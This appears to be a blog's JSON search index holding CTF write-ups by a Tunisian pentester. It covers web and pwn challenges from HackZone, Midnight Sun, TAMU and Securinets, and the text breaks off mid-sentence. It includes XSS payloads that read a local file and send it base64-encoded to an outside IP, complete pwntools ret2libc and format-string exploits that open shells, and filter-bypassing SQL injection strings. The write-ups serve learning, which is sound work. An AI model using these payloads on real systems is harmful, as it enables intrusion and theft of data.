[{"authors":["kahla"],"categories":null,"content":"Pentester, Security Enthusiastic from Tunisia, I enjoy playing in hacking and pentesting competitions and skip classes to play CTF.\n","date":1566333101,"expirydate":-62135596800,"kind":"taxonomy","lang":"en","lastmod":1566333101,"objectID":"b6c9ad53abeba5bdfba580c41a4e130a","permalink":"https://ahmed-belkahla.me/authors/kahla/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/authors/kahla/","section":"authors","summary":"Pentester, Security Enthusiastic from Tunisia, I enjoy playing in hacking and pentesting competitions and skip classes to play CTF.","tags":null,"title":"Belkahla Ahmed","type":"authors"},{"authors":["kahla"],"categories":null,"content":"Pentester, Security Enthusiastic from Tunisia, I enjoy playing in hacking and pentesting competitions and skip classes to play CTF.\n","date":-62135596800,"expirydate":-62135596800,"kind":"taxonomy","lang":"en","lastmod":-62135596800,"objectID":"2525497d367e79493fd32b198b28f040","permalink":"https://ahmed-belkahla.me/authors/admin/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/authors/admin/","section":"authors","summary":"Pentester, Security Enthusiastic from Tunisia, I enjoy playing in hacking and pentesting competitions and skip classes to play CTF.","tags":null,"title":"Belkahla Ahmed","type":"authors"},{"authors":null,"categories":null,"content":"Hello guys , HackZone VIII CTF has ended this morning , i participated with my team Fword and we got the 4th place, here is my writeup for the three web challenges I managed to solve :D\nBabyWeb1(722pts)(10 solves) In this task we are given a platform where we can share a picture with some msg and it generates a password for us to access these details ,there are already some pictures posted by the author, so we have to access them and maybe the flag in the details of one of them.\nTrying to post a picture with the same title of the posted pictures will be denied so let\u0026rsquo;s try SQL truncation attack and submit a picture with these details :\n Title : \u0026ldquo;naaah \u0026quot; url : \u0026ldquo;anything here\u0026rdquo; -msg : \u0026ldquo;anything\u0026rdquo;  And Bingo it passed the title check and we got a password :D\nUsing this password will give us the details of the picture and the flag if we check the source code :D\nInsecure(884pts)(4 solves) I really had a lot of fun playing this task ,we are given a text to image converter website , as the description said the first part of the flag is due to a misconfiguration so the first thing i thinked about is a bucket misconfig and it was the case.\nAccessing this url will give us the first part (The same bucket where Hackzone Logo is stored)\n https://storage.googleapis.com/hzviii/flag_part1.txt\n 1st Part: HZVIII{Buck3t_M1sc0nf1gur4t1on_\nLet\u0026rsquo;s start the second part which is the most interesting , we have to read this file /psycor/flag_part2.txt , so the first thing i thinked about was abusing an SSRF and read local files . It was a php website so firstly i thinked that maybe we will use an exploit in the famous GD library of php or something like that but it was only a rabbit hole xd\nAfter some enumeration i discovered that we have an XSS here , so things are becoming clearer maybe it\u0026rsquo;s using phantom Js to convert this text .\nOur scenario now is revealed , we\u0026rsquo;ll exploit this XSS vulnerability to read local files , we have also to mention that the script tag was filtered . I passed a lot of time in this part and tried a lot with basically this payload but i didn\u0026rsquo;t get anything :\n\u0026lt;img src=\u0026quot;aa\u0026quot; onerror=\u0026quot;function reqListener () { var encoded = encodeURI(this.responseText); var b64 = btoa(this.responseText); var raw = this.responseText; document.write('\u0026lt;iframe src=\u0026quot;http://100.26.206.184:1234/?a='+b64+'\u0026quot;\u0026gt;\u0026lt;/iframe\u0026gt;'); } var oReq = new XMLHttpRequest(); oReq.addEventListener('load', reqListener); oReq.open('GET', 'file:///psycor/flag_part2.txt'); oReq.send();\u0026quot;\u0026gt;  I have than tried to read it using iframes but i didn\u0026rsquo;t have any results :'(\nThis was really painful xd i thinked that maybe using onerror attribute , phantom Js won\u0026rsquo;t wait until XMLHttpRequest fetch the content of the file , so maybe we have to use the script tag ? But it\u0026rsquo;s filtered so all we have to do is bypass this filter :D\nAs we see in the picture below , the script word is stripped so what if we enter :\n scscriptript\n The script word will be stripped and Bingo we will have our script tag , let\u0026rsquo;s try it\nYeees It workeed :D so now how will we use the script tag ? we will simply try to convert this line now :\n\u0026lt;scscriptript src=\u0026quot;http://100.26.206.184:1234/test.js\u0026quot;\u0026gt;\u0026lt;/scscriptript\u0026gt;  NOTE : It\u0026rsquo;s my VPS IP so DONT use it :D\nAnd i hosted the test.js file in my server , this is its content , we will try to read the file using XMLHttpRequest so basically the same payload as below\nfunction reqListener () { var encoded = encodeURI(this.responseText); var b64 = btoa(this.responseText); var raw = this.responseText; document.write('\u0026lt;iframe src=\u0026quot;http://100.26.206.184:1234/?a='+b64+'\u0026quot;\u0026gt;\u0026lt;/iframe\u0026gt;'); } var oReq = new XMLHttpRequest(); oReq.addEventListener(\u0026quot;load\u0026quot;, reqListener); oReq.open(\u0026quot;GET\u0026quot;, \u0026quot;file:///psycor/flag_part2.txt\u0026quot;); oReq.send();  And yees we received an answer :D\nBase64 decoding it will give us the last part of the flag :D I really enjoyed this task so thank you @PsycoR for your efforts\nCalculator(722pts)(10 solves) This task was pretty obvious , we have x and y parameters and the web app calculates their division , if we enter any character we will have the error page and Bingo debug mode is true :D\nWe will now leak the Secret key of the app and sign a session cookie that has the attribute \u0026ldquo;is_admin\u0026rdquo; set to True .\nTo do that we will use flask-unsign tool with the following command :\n flask-unsign \u0026ndash;sign \u0026ndash;cookie \u0026ldquo;{\u0026lsquo;is_admin\u0026rsquo;: True}\u0026rdquo; \u0026ndash;secret \u0026lsquo;DeRz7YDZ5nCDqR3vt33QpuhkrSYLmuX8\u0026rsquo; \u0026ndash;legacy\n And changing the cookie will give us the flag !\nI want to thank the organizers for this cool CTF and nice tasks, unfortunately i didn\u0026rsquo;t have enough time to look at pwn tasks :( I really have to sleep now so if you have any questions contact me on Twitter @BelkahlaAhmed1\n","date":1586650244,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1586650244,"objectID":"1c5a2f32bd14bf04489c0075204d25df","permalink":"https://ahmed-belkahla.me/post/hackzone-viii/","publishdate":"2020-04-12T00:10:44Z","relpermalink":"/post/hackzone-viii/","section":"post","summary":"Web writeups for Hackzone VIII CTF","tags":null,"title":"HackZone VIII - Web Writeups","type":"post"},{"authors":null,"categories":null,"content":"pwn1(70pts) It was a ret2libc task , but we had firstly to leak the libc base address using BOF (i leaked it through printf address) than we will return to main and perform our ret2 System :D here is my exploit, if you have any questions you can contact me on twitter @BelkahlaAhmed1\nfrom pwn import * p=remote(\u0026quot;pwn1-01.play.midnightsunctf.se\u0026quot;,10001) #p=process(\u0026quot;./pwn1\u0026quot;) OFFSET=cyclic(72) POP_RDI_RET=p64(0x0000000000400783) PUTS=p64(0x0000000000400550) LEAK=p64(0x602020) MAIN=p64(0x400698) payload=OFFSET+POP_RDI_RET+LEAK+PUTS+MAIN log.info(\u0026quot;Payload Crafted\u0026quot;) p.recvuntil(\u0026quot;buffer:\u0026quot;) log.info(\u0026quot;Sending payload\u0026quot;) #raw_input(\u0026quot;attach\u0026quot;) p.sendline(payload) data=p.recvline().strip() leak=u64(data.ljust(8,\u0026quot;\\x00\u0026quot;)) BASE_LIBC=leak-0x64e80 # local 0x54a20 log.info(\u0026quot;leaked libc base: \u0026quot;+hex(BASE_LIBC)) p.recvuntil(\u0026quot;buffer:\u0026quot;) #BINSH=p64(BASELIBC+0x183cee) #SYSTEM=p64(BASELIBC+0x46ed0) RET=p64(0x0000000000400536) SYSTEM=p64(BASE_LIBC+0x4f440) BINSH=p64(BASE_LIBC+0x1b3e9a) payload=OFFSET+RET+POP_RDI_RET+BINSH+SYSTEM p.sendline(payload) p.interactive()  NOTE: Check Task files ** HERE **\npwn2(80pts) It was a really fun task , we had a format string vulnerability , so firstly i overwrited the GOT entry of the exit function with main address so we have now an infinite loop and the program will never exit , than using format string we leak the libc base address and than we overwrite the GOT entry of printf with the address of system :D Here is my exploit , if you have any questions you can contact me o twitter @BelkahlaAhmed1\nfrom pwn import * def extract(add,n): p1=\u0026quot;0x\u0026quot;+add[-4:] p2=add[:6] if n==1: return p1 if n==2: return p2 def pad(payload): return payload+\u0026quot;X\u0026quot;*(63-len(payload)) #p=process(\u0026quot;./pwn2\u0026quot;) p=remote(\u0026quot;pwn2-01.play.midnightsunctf.se\u0026quot;,10002) p.recvuntil(\u0026quot;input:\u0026quot;) EXITGOT=p32(0x804b020) EXITGOT2=p32(0x804b020+2) ''' s=\u0026quot;\u0026quot; for i in range(27,34): s+=\u0026quot;%\u0026quot;+str(i)+\u0026quot;$p \u0026quot; ''' payload=EXITGOT+EXITGOT2 payload+=\u0026quot;%2044x%8$hn%32231x%7$hn\u0026quot; #raw_input(\u0026quot;attach\u0026quot;) p.sendline(pad(payload)) p.recvuntil(\u0026quot;input:\u0026quot;) p.sendline(pad(\u0026quot;%30$x\u0026quot;)) data=p.recvuntil(\u0026quot;X\u0026quot;) printf=int(\u0026quot;0x\u0026quot;+data[-9:-1],16)-5 LIBCBASE=printf-0x50b60 log.info(\u0026quot;Leaked Libc Base : \u0026quot;+hex(LIBCBASE)) p.recvuntil(\u0026quot;input:\u0026quot;) PRINTFGOT=p32(0x804b00c) PRINTFGOT2=p32(0x804b00c+2) SYSTEM=LIBCBASE+0x3cd10 log.info(\u0026quot;System address: \u0026quot;+hex(SYSTEM)) payload=PRINTFGOT payload+=PRINTFGOT2 p1=int(extract(hex(SYSTEM),1),16) p2=int(extract(hex(SYSTEM),2),16) log.info(\u0026quot;P1: \u0026quot;+str(p1-8)+\u0026quot; P2: \u0026quot;+str(p2-p1)) payload+=\u0026quot;%\u0026quot;+str(p1-8)+\u0026quot;x%7$hn%\u0026quot;+str(p2-p1)+\u0026quot;x%8$hn\u0026quot; log.info(\u0026quot;Payload crafted\u0026quot;) p.sendline(pad(payload)) p.recvuntil(\u0026quot;input:\u0026quot;) p.sendline(\u0026quot;/bin/sh\u0026quot;) p.interactive() #Main address 0x80485eb # 7 stack adress  NOTE: Task files  HERE\nThese tasks were really fun, i\u0026rsquo;m sorry for the lack of details because i\u0026rsquo;m really busy this period :(\n","date":1585958400,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1585958400,"objectID":"525946de77e6864e40805467cb9a5d55","permalink":"https://ahmed-belkahla.me/post/midnight-sun-ctfquals/","publishdate":"2020-04-04T00:00:00Z","relpermalink":"/post/midnight-sun-ctfquals/","section":"post","summary":"pwn1(70pts) It was a ret2libc task , but we had firstly to leak the libc base address using BOF (i leaked it through printf address) than we will return to main and perform our ret2 System :D here is my exploit, if you have any questions you can contact me on twitter @BelkahlaAhmed1","tags":null,"title":"Midnight Sun CTF Quals 2020 - Pwn Writeups","type":"post"},{"authors":null,"categories":null,"content":"B64DECODER (244pts) This is wont be a detailed writeup , however in this task we have a clear format string vulnerability (line 23) and a leak of a64l function address\nThe idea is to overwrite the GOT entry of a64l function with the address of system in libc (not system@plt) using the format string vulnerability , it\u0026rsquo;s also a partial overwrite because we have a limited length of input (32 characters) and using the leaked address of a64l we can easily know the address of system function , here is my exploit :\nfrom pwn import * import struct import sys def pad(str): return str+\u0026quot;X\u0026quot;*(32-len(str)) payload=\u0026quot;\u0026quot; #p=process(\u0026quot;./b64decoder\u0026quot;) p=remote(\u0026quot;challenges.tamuctf.com\u0026quot;,2783) d=p.recvuntil(\u0026quot;name!\u0026quot;) A64Ladd=d[:-18][-10:] TOWRITE=\u0026quot;0x\u0026quot;+A64Ladd[-4:] sys=int(TOWRITE,16)-1680-4 #A64l-0x690 log.info(TOWRITE) log.info(sys) A64L_PLT=0x804b398 a64lADD=p32(A64L_PLT) payload+=a64lADD payload+=\u0026quot;%\u0026quot;+str(sys)+\u0026quot;x%71$hn\u0026quot; log.info(\u0026quot;payload crafted\u0026quot;) p.sendline(payload) log.info(\u0026quot;Sent , Haaaw el shell\u0026quot;) p.interactive()  And Bingo we got our shell :D\nNOTE: Task files  HERE\nTROLL (50pts) In this task we are supposed to win a game by guessing the next 100 random numbers , looking at the source code we can see the vulnerable gets function , after that we are setting the seed value to the time and finally the beginning of the loop and generating the random numbers and questions each time .\nMy idea was to overwrite the seed value with our own value than BINGO we can generate the next random numbers and win the game , i have done things manually , i entered a unique seaquence and than observed with gdb if i have overwritten where the seed value is stored\nMy input :\n AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ\n I have entered a sequence of alphabet characters and stopped in the call of srand function , you can see te RDI register(where the 1st argument passed to a function is stored) hold the value of \u0026ldquo;MMMM\u0026rdquo; so if we replace \u0026ldquo;MMMM\u0026rdquo; with the value we want , this value will be the seed for the random numbers.\nI have written this little C program to generate 100 random numbers using our chosen seed and stored them in a file :\n#include\u0026lt;stdlib.h\u0026gt; #include\u0026lt;stdio.h\u0026gt; #include\u0026lt;time.h\u0026gt; int main(int argc, char *argv[]){ int i=0; int seed=3472328296227680305 //0x1000 in decimal srand(seed); for(i=0;i\u0026lt;=99;i++){ int a=rand()% 100000 + 1; printf(\u0026quot;%d\\n\u0026quot;,a); } return 0; }  After that i have written this exploit to overwrite the seed value with 0x1000 and answer the questions using the numbers we have generated\nfrom pwn import * #p=process(\u0026quot;./troll\u0026quot;) p=remote(\u0026quot;challenges.tamuctf.com\u0026quot;,4765) p.recvuntil(\u0026quot;Who goes there?\u0026quot;) SEED=\u0026quot;AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP1000\u0026quot; p.sendline(SEED) log.info(\u0026quot;Sent First payload\u0026quot;) answers=open(\u0026quot;answer\u0026quot;,\u0026quot;r\u0026quot;) for line in answers: p.recvuntil(\u0026quot;What is it?\u0026quot;) log.info(\u0026quot;sending answer: \u0026quot;+line) p.sendline(line) p.interactive()  Note: the offset in the remote server is different, so i had to guess it xD However we got our flag :\nNOTE: Task files  HERE\nThis is the first time writing a pwn writeup so i hope you enjoyed it , any questions you can find me on twitter @BelkahlaAhmed1\n","date":1585526400,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1585526400,"objectID":"8885cf0419d47e79f6839de4334aaead","permalink":"https://ahmed-belkahla.me/post/tamuctfpwn/","publishdate":"2020-03-30T00:00:00Z","relpermalink":"/post/tamuctfpwn/","section":"post","summary":"B64DECODER (244pts) This is wont be a detailed writeup , however in this task we have a clear format string vulnerability (line 23) and a leak of a64l function address","tags":null,"title":"TAMU CTF 2020 - Pwn Writeups","type":"post"},{"authors":null,"categories":null,"content":"The after-Prequal (971pts) (19 Solves) This task was so fun and i learned new things from it , we are given a website with a search functionality and after testing a single quote injection we had an SQL error , so let\u0026rsquo;s start the exploitation of the famous SQL injection :D\nAfter the basic enumeration we can notice that these characters are filtered : [\u0026rdquo; \u0026ldquo;,\u0026quot;-\u0026quot;,\u0026quot;,\u0026quot;] so we will use the following bypasses:\n The white space : %0A The \u0026ldquo;-\u0026rdquo; : we will use # to comment The \u0026ldquo;,\u0026rdquo; : we will use join to bypass it  This step took me some time , after some tries i succeeded in equilibrating the query :\n ?search=\u0026rsquo;)union%0Aselect%0A*%0Afrom%0A((select%0A1)a%0Ajoin%0A(select%0A2)b%0Ajoin%0A(select%0A3)c)%0A%23\n And BINGO ! we succeeded to inject , all we have to do know is to dump the database as usual\n Tables:   ?search=\u0026rsquo;)union%0Aselect%0A*%0Afrom%0A((select%0A1)a%0Ajoin%0A(select%0Atable_name%0AfRoM%0Ainformation_schema.tables)b%0Ajoin%0A(select%0A3)c)%0A%23\n Table name: secrets\nColumns:   ?search=\u0026rsquo;)union%0Aselect%0A*%0Afrom%0A((select%0A1)a%0Ajoin%0A(select%0Acolumn_name%0Afrom%0Ainformation_schema.columns%0Awhere%0Atable_name=\u0026quot;secrets\u0026rdquo;)b%0Ajoin%0A(select%0A3)c)%0A%23\n The interesting Column name : value\nAnd finally :\n ?search=\u0026rsquo;)union%0Aselect%0A*%0Afrom%0A((select%0A1)a%0Ajoin%0A(select%0Avalue%0Afrom%0Asecrets)b%0Ajoin%0A(select%0A3)c)%0A%23\n Damn no flag for us :'( but no problem maybe if we just do load_file(\u0026ldquo;flag.txt\u0026rdquo;) we will have the flag ? unfortunately it wont work, in fact it\u0026rsquo;s not that easy and this is the most juicy part of the task xd i checked the privileges of the current user and the FILE permission was not grantable ! wtf , this result was unpredictable for me so i started digging in mysql file permissions docs until i found this :D\n To limit the location in which files can be read and written, set the secure_file_priv system variable to a specific directory. See Section 5.1.8, “Server System Variables”.\n So probably the author have set a custom location in the global variable secure_file_priv , let\u0026rsquo;s check its value in @@GLOBAL.secure_file_priv\n ?search=\u0026rsquo;)union%0Aselect%0A*%0Afrom%0A((select%0A1)a%0Ajoin%0A(select%0A@@GLOBAL.secure_file_priv)b%0Ajoin%0A(select%0A3)c)%0A%23\n BINGOOO ! so let\u0026rsquo;s have our flag now :\n ?search=\u0026rsquo;)union%0Aselect%0A*%0Afrom%0A((select%0A1)a%0Ajoin%0A(select%0Aload_file(\u0026quot;/var/lib/mysql-files/flag/flag.txt\u0026rdquo;))b%0Ajoin%0A(select%0A3)c)%0A%23\n FLAG : Securinets{SecuR3_YourSQL!} , I have enjoyed this task and learned a lot about mysql privileges from it , thank you @bibiwars or should i call you @nox xD If you enjoyed the writeup share it with your friends and don\u0026rsquo;t hesitate to ask me on twitter @BelkahlaAhmed1 :D\n","date":1584921600,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1584921600,"objectID":"8fc0821de4f778391335b6e40e77170d","permalink":"https://ahmed-belkahla.me/post/the-after-prequalsecurinetsquals/","publishdate":"2020-03-23T00:00:00Z","relpermalink":"/post/the-after-prequalsecurinetsquals/","section":"post","summary":"The after-Prequal (971pts) (19 Solves) This task was so fun and i learned new things from it , we are given a website with a search functionality and after testing a single quote injection we had an SQL error , so let\u0026rsquo;s start the exploitation of the famous SQL injection :D","tags":null,"title":"The After Prequal - Securinets Quals 2k20","type":"post"},{"authors":null,"categories":null,"content":"Empire Total (1000pts) (7 Solves) This task was really so creative and i had so fun solving it , but i can\u0026rsquo;t deny that it was painful :( after reading the description we can say that we aim to dump the database of the website (maybe SQL injection who knows) and fortunately we have the source code so let\u0026rsquo;s download it and begin our trip xD\nAfter Visiting the website we find a tool based on Virus Total API , understanding the functionality of the website is really necessary for solving the task, we will cover it in details later, but as a first thought we give an ip address to the website and it will shows Virus Total stats about it\nAfter cloning the project here is its structure\n git clone https://github.com/mohamedaymenkarmous/virustotal-api-html\n let\u0026rsquo;s take a look at index.php , since the code is really too long i will only put the important parts, as we can see after some configurations and Recaptcha setting, all the SQL queries are prepared statements so there is no way to perform SQL injection but we can notice the execution of the shell_exec function :D Interesting hmmm\nshell_exec is executing some python script with a scanned ip argument ,maybe manipulating it will give us something useful\n$command = \u0026quot;../VirusTotal.py '$scanned_ip'\u0026quot;; $output = shell_exec($command);  But unfortunately there\u0026rsquo;s too much restriction on our input :( it\u0026rsquo;s impossible to bypass the filter_var here and the JS restrictions (if you can bpass it just tell me xD )\nif(isset($_POST) \u0026amp;\u0026amp; !empty($_POST)){ $scanned_ip=isset($_POST['ip']) \u0026amp;\u0026amp; !empty($_POST['ip']) \u0026amp;\u0026amp; !is_array($_POST['ip']) ? $_POST['ip'] : \u0026quot;\u0026quot;; if(!$scanned_ip){header(\u0026quot;Location: /?invalid_ip\u0026quot;);exit();} if (filter_var($scanned_ip, FILTER_VALIDATE_IP)) { } else {header(\u0026quot;Location: /?invalid_ip\u0026quot;);exit();}  Let\u0026rsquo;s proceed , it seems that the index.php is pretty safe ,let\u0026rsquo;s take a look at the VirusTotal.py script\nOMG :'( 499 lines , that was so discouraging @Emperors :( but we needed that flag to have the 10th place xD anyway after scrolling around and reading the code , we can somehow understand the behaviour of the website, when we enter the ip address it asks the Virus Total API for the results and then there\u0026rsquo;s the persistence functionality that saves the results in the database and then when we enter the same ip address again it will loads the results from the database .\nSo if we can control the results maybe we will have the opportunity to perform an SQL injection ? I got stuck in this part for a long time and after the help of the admin ( Thank you @Emperors \u0026lt;3 ) i found something interesting :D\nbefore we proceed here\u0026rsquo;s a vulnerable function to SQL injection that saves the results of urls section in the database (line 417 in VirusTotal.py)\ndef persistURLs(self,selected_ips,ip_report_filtered): attr=\u0026quot;detected_urls\u0026quot; table_name=\u0026quot;vt_scanned_urls_table\u0026quot; newAttr=self.AttrSubstitution[attr] if attr in self.AttrSubstitution else attr selected_urls=self.findPersistedIP(selected_ips[0]['id'],table_name) selected_urls_filtered=[] for selected_url in selected_urls: selected_urls_filtered.append(selected_url['url']) if newAttr in ip_report_filtered: for url in ip_report_filtered[newAttr]: print(url['URL']) if url['URL'] not in selected_urls_filtered: try: self.CursorRW.execute(\u0026quot;INSERT INTO \u0026quot;+table_name+\u0026quot; (ip_id,url,detections,scanned_time) VALUES ('\u0026quot;+str(selected_ips[0]['id'])+\u0026quot;','\u0026quot;+url['URL']+\u0026quot;','\u0026quot;+url['Detections']+\u0026quot;','\u0026quot;+url['Scanned']+\u0026quot;')\u0026quot;) self.DBRW.commit() self.resetSQL() except Exception as e: print(\u0026quot;INSERT INTO \u0026quot;+table_name+\u0026quot; (ip_id,url,detections,scanned_time) VALUES ('\u0026quot;+str(selected_ips[0]['id'])+\u0026quot;','\u0026quot;+url['URL']+\u0026quot;','\u0026quot;+url['Detections']+\u0026quot;','\u0026quot;+url['Scanned']+\u0026quot;')\u0026quot;) print(\u0026quot;EXCEPTION: \u0026quot;,e) self.resetSQL()  Exploitation So the idea is that if we go to VirusTotal website (https://www.virustotal.com/) and scan a url ,and then go back to our challenge website and scan the url\u0026rsquo;s ip we will find that the url we scanned in VirusTotal website will appear , it\u0026rsquo;s pretty confusing i know so let\u0026rsquo;s have an example\n We go to Virus Total website and scan for any url for example :( in my case i launched a web server on my VPS and used it here )   http://100.26.206.184/?u=Just testing for the writeup :p\n Now we go back to the challenge website and scan the ip address  Yeeees ! it\u0026rsquo;s appearing in the results so we now have the control over these values in the urls section of the results.\nNow here is our scenario , if we look to the vulnerable function persistURLs in VirusTotal.py we can notice the injection in this query (line 430)\n INSERT INTO \u0026ldquo;+table_name+\u0026rdquo; (ip_id,url,detections,scanned_time) VALUES ('\u0026ldquo;+str(selected_ips[0][\u0026lsquo;id\u0026rsquo;])+\u0026rdquo;','\u0026ldquo;+url[\u0026lsquo;URL\u0026rsquo;]+\u0026rdquo;','\u0026ldquo;+url[\u0026lsquo;Detections\u0026rsquo;]+\u0026rdquo;','\u0026ldquo;+url[\u0026lsquo;Scanned\u0026rsquo;]+\u0026rdquo;')\n We have control over the url[\u0026lsquo;URL\u0026rsquo;] parameter (the url we scan in VirusTotal Website) so it\u0026rsquo;s now an SQL injection in INSERT INTO values, but we have some constraints :\n The url encoding %20 that will be interpreted with the SQL query so we have to find another way in our payload instead of white spaces which is a well known bypass: /**/ The second thing faced me when i was solving the challenge , we can\u0026rsquo;t use \u0026ndash; - to equilibrate the SQL query so we will have to find a solution to equilibrate it  In order to test the injection locally i have created this small script that connects to my local DB and executes the same query, you can find it  HERE\nFinally I opted to this solution, here is the URL we will scan :\n http://100.26.206.184/?u=\u0026rsquo;,(select/**/1),(select/**/2)),(\u0026lsquo;102\u0026rsquo;,\u0026lsquo;a\n The complete SQL query that will be executed is :\n INSERT INTO detected_urls (ip_id,url,detections,scanned_time) VALUES (\u0026lsquo;2\u0026rsquo;,\u0026lsquo;100.26.206.184/?u=\u0026rsquo;,(select 1),(select 2)),(\u0026lsquo;102\u0026rsquo;,\u0026lsquo;a\u0026rsquo;,\u0026lsquo;15\u0026rsquo;,\u0026lsquo;yes\u0026rsquo;)\n Let\u0026rsquo;s try it now , we first scan it in VirusTotal :\nAnd now let\u0026rsquo;s scan the IP in the challenge website :\nIt\u0026rsquo;s fetched successfully, let\u0026rsquo;s scan the ip another time now to check if our injection succeeded or not, we must see 1,2 in the output :\nBingo ! our injection worked , we only have to dump the entire Database now and repeat the same procedure:\n Dump DB names :   http://100.26.206.184/?u=\u0026rsquo;,(select/**/gRoUp_cOncaT(0x7c,schema_name,0x7c)/**/fRoM/**/information_schema.schemata),(select/**/2)),(\u0026lsquo;102\u0026rsquo;,\u0026lsquo;a\n DBName : MySecretDatabase\nDump Tables and Columns :   http://100.26.206.184/?u=\u0026rsquo;,(select/**/gRoUp_cOncaT(0x7c,table_name,0x7c)/**/fRoM/**/information_schema.tables),(select/**/2)),(\u0026lsquo;102\u0026rsquo;,\u0026lsquo;a\n  http://100.26.206.184/?u=\u0026rsquo;,(select/**/gRoUp_cOncaT(0x7c,column_name,0x7c)/**/fRoM/**/information_schema.columns),(select/**/2)),(\u0026lsquo;103\u0026rsquo;,\u0026lsquo;a\n Table Name : SecretTable \u0026amp; Column Name : secret_value\nAnd finally let\u0026rsquo;s have our beloved flag :   http://100.26.206.184/?u=\u0026rsquo;,(select/**/group_concat(0x7c,secret_value,0x7c)/**/fRoM/**/MySecretDatabase.SecretTable),(select/**/2)),(\u0026lsquo;109\u0026rsquo;,\u0026lsquo;a\n Yees We did it , FLAG : Securinets{EmpireTotal_Pwn3D_fr0m_Th3_0th3r_S1de}\nI have really liked the idea of the challenge, it\u0026rsquo;s really creative , i want to thank Securinets technical team for these fun tasks and awesome CTF and of course the author @TheEmperors.\nI hope you liked the writeup if you have any questions don\u0026rsquo;t hesitate to contact me Twitter : @BelkahlaAhmed1 , finally i can sleep in peace after these 24 hours xd\n","date":1584748800,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1584748800,"objectID":"5442b7b56fe4b087fc22ba29c9195065","permalink":"https://ahmed-belkahla.me/post/empire-total-securinetsquals20/","publishdate":"2020-03-21T00:00:00Z","relpermalink":"/post/empire-total-securinetsquals20/","section":"post","summary":"Empire Total (1000pts) (7 Solves) This task was really so creative and i had so fun solving it , but i can\u0026rsquo;t deny that it was painful :( after reading the description we can say that we aim to dump the database of the website (maybe SQL injection who knows) and fortunately we have the source code so let\u0026rsquo;s download it and begin our trip xD","tags":null,"title":"Empire Total - Securinets Quals 20","type":"post"},{"authors":null,"categories":null,"content":"A Peculiar Query (180pts) (73 Solves) I really liked this web task , we are given this web page that have a search functionality\nAnd we can read the source code\nconst express = require(\u0026quot;express\u0026quot;); const rateLimit = require(\u0026quot;express-rate-limit\u0026quot;); const app = express(); const { Pool, Client } = require(\u0026quot;pg\u0026quot;); const port = process.env.PORT || 9090; const path = require(\u0026quot;path\u0026quot;); const client = new Client({ user: process.env.DBUSER, host: process.env.DBHOST, database: process.env.DBNAME, password: process.env.DBPASS, port: process.env.DBPORT }); async function query(q) { const ret = await client.query(`SELECT name FROM Criminals WHERE name ILIKE '${q}%';`); return ret; } app.set(\u0026quot;view engine\u0026quot;, \u0026quot;ejs\u0026quot;); app.use(express.static(\u0026quot;public\u0026quot;)); app.get(\u0026quot;/src\u0026quot;, (req, res) =\u0026gt; { res.sendFile(path.join(__dirname, \u0026quot;index.js\u0026quot;)); }); app.get(\u0026quot;/\u0026quot;, async (req, res) =\u0026gt; { if (req.query.q) { try { let q = req.query.q; // no more table dropping for you let censored = false; for (let i = 0; i \u0026lt; q.length; i ++) { if (censored || \u0026quot;'-\\\u0026quot;.\u0026quot;.split``.some(v =\u0026gt; v == q[i])) { censored = true; q = q.slice(0, i) + \u0026quot;*\u0026quot; + q.slice(i + 1, q.length); } } q = q.substring(0, 80); const result = await query(q); res.render(\u0026quot;home\u0026quot;, {results: result.rows, err: \u0026quot;\u0026quot;}); } catch (err) { console.log(err); res.status(500); res.render(\u0026quot;home\u0026quot;, {results: [], err: \u0026quot;aight wtf stop breaking things\u0026quot;}); } } else { res.render(\u0026quot;home\u0026quot;, {results: [], err: \u0026quot;\u0026quot;}); } }); app.listen(port, function() { client.connect(); console.log(\u0026quot;App listening on port \u0026quot; + port); });  Overview It\u0026rsquo;s pretty obvious that we have an sql injection here ( we are concatenating the user input )\n const ret = await client.query(SELECT name FROM Criminals WHERE name ILIKE '${q}%';);\n But as we can see some filters are here :'( these characters are filtered : [',-,\u0026quot;,.] , after some tries i have figured that it will be impossible to bypass them so i started looking to some JS tricks. As we can see the filter function is looping over our input and checks if there are some prohibited characters and then it will replace them with \u0026ldquo;*\u0026rdquo; , For example if we type\n hello\u0026quot;or 1=1 \u0026ndash; -\n Our input will be changed to :\n hello************\n let q = req.query.q; let censored = false; for (let i = 0; i \u0026lt; q.length; i ++) { if (censored || \u0026quot;'-\\\u0026quot;.\u0026quot;.split``.some(v =\u0026gt; v == q[i])) { censored = true; q = q.slice(0, i) + \u0026quot;*\u0026quot; + q.slice(i + 1, q.length); } }  And finally it\u0026rsquo;s using substring function to limit our input\u0026rsquo;s length to 80 characters\nq = q.substring(0, 80); const result = await query(q); res.render(\u0026quot;home\u0026quot;, {results: result.rows, err: \u0026quot;\u0026quot;});  Hmmm everything seems okay nah ? but it\u0026rsquo;s a ctf web task we have to find some vulnerabilities ! let\u0026rsquo;s pass to how i did to solve it now, enough boring things\nExploitation The first thing i thinked about was http parameter pollution in express (read about it  HERE if you want ) ,briefly when we enter a get parameter multiple times express has a weird interpretation , it will process this parameter as an array for example here, if we pass this in the query :\n ?q=hello\u0026amp;q=allo\u0026amp;q=fword\n req.query.q will be parsed as an array [\u0026ldquo;hello\u0026rdquo;,\u0026ldquo;allo\u0026rdquo;,\u0026ldquo;fword\u0026rdquo;] , so if we go further when we will be iterating of q variable we will be comparing each array field with the filters for example, if we pass this query :\n q=\u0026quot;or 1=1 \u0026ndash; -\u0026amp;q=fword\n we will firstly compare \u0026ldquo;or 1=1 \u0026ndash; - and then the second field fword with these filtered chars [',-,\u0026quot;,.] , they are not equal ! , Youupi we can get our flag now as we passed the check .\nUnfortunately , it\u0026rsquo;s not that easy ,have you forgot the substring function ? an array has not a built in substring function so when we reach the substring part this will raise an error so we won\u0026rsquo;t execute the sql query :/ Javascript weird behaviour will save us this time ! if we do []+[] the result is a string , the sum of two arrays is a string so if we enter a \u0026quot; in one query parameter we will enter this part\ncensored = true; q = q.slice(0, i) + \u0026quot;*\u0026quot; + q.slice(i + 1, q.length);  and arrays have 